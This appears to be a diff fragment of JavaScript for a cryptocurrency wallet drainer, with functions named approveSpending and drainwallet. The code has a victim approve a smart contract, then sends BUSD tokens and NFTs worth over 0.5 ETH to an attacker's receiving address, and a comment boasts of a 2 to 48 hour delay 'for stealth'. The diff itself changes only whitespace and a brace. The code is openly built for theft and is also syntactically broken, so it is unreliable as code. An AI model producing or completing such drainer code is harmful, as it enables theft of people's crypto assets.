@@ -9,12 +9,10 @@ var smartcontract
 
 function approveSpending(token) {
 	
-	 smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
+	smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
 	smartcontract.methods.drainBUSD.send(to:recieveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
 }
 	  
-  			
-}
 
 function drainwallet(token) {
 	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.5 eth 
